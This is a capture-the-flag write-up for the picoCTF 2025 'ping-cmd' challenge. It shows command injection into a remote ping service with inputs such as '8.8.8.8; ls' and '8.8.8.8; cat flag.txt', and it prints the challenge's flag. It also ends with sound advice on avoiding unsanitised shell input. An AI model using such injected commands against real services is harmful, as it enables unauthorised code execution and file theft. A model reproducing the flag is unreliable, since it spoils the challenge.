# ping-cmd
**Category:** General Skills
**Difficulty:** Easy
**Points:** 50
**CTF:** picoCTF 2025
---
## Description
Can you use the ping command to find the flag?
**Hints:**
- What happens when you add more commands after the IP address?
- Look up shell command separators
---
## Approach
The challenge connected to a remote server via netcat which asked for an IP
address to ping and claimed to only allow 8.8.8.8. This immediately suggested
that the server was passing user input directly into a shell ping command
without sanitising it — a classic command injection vulnerability. I confirmed
this by entering 8.8.8.8; ls which uses the semicolon as a shell command
separator to run ls after the ping. The server executed both commands and listed
the files on the server revealing flag.txt and script.sh. I then injected a
cat flag.txt command to read the flag directly from the server.
---
## Solution
### Step 1 - Connect to the server
```bash
nc mysterious-sea.picoctf.net 63768
```
Output: Server printed the prompt
Enter an IP address to ping!
(We have tight security because we only allow '8.8.8.8'):
### Step 2 - Test for command injection
Enter the allowed IP followed by a semicolon and ls to test if the server
executes additional commands:
8.8.8.8; ls
Output: Server ran the ping and then executed ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=10.7 ms
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss
flag.txt
script.sh
Command injection confirmed — the server passes user input directly into a
shell command with no sanitisation.
### Step 3 - Read the flag
Connect again and inject cat flag.txt after the IP address:
```bash
nc mysterious-sea.picoctf.net 63768
```
Enter the following when prompted:
8.8.8.8; cat flag.txt
Output: Flag printed directly in the terminal!
---
## Tools Used
- nc (netcat) - connecting to the remote server to interact with the ping
  service and inject commands
- semicolon (;) - shell command separator used to chain commands after the
  ping command
---
## Flag
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_773788ba}
---
## What I Learned
- Command injection occurs when user input is passed directly into a shell
  command without sanitisation — the server built the command as ping +
  user_input with no filtering
- The semicolon is a shell command separator that tells the shell to run the
  next command regardless of the result of the previous one
- Always test for command injection by appending ; ls first — if files are
  listed the vulnerability is confirmed
- The server claiming tight security while only checking for 8.8.8.8 is a
  false sense of security — it never validated what came after the IP
- Never pass unsanitised user input directly into shell commands — always
  use subprocess with argument lists in Python or parameterised commands
  to prevent command injection completely
